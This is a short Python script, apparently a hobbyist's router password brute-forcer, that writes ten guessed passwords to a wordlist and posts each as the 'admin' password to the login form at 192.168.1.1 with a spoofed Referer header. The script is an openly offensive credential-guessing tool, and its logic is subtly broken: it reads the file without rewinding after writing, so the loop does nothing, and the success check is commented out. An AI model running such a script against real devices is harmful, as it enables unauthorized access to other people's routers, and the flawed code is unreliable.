import requests


wordlist = open('wordlist.txt','r+')


for i in range(10):
    wordlist.write('user123'+ str(i) + '\n')
    
cabecalho = {'User-agente': 'windows', 'Referer': 'https://www.google.com'}

for letra in wordlist:

    dados = {'User':'admin', 'Passwd': letra}
    requisicao = requests.post('http://192.168.1.1/goform/webLogin', data=dados, headers=cabecalho)
    print(requisicao.status_code, letra)
  


    #if requisicao.status_code != 404:
    #   print('senha:', letra)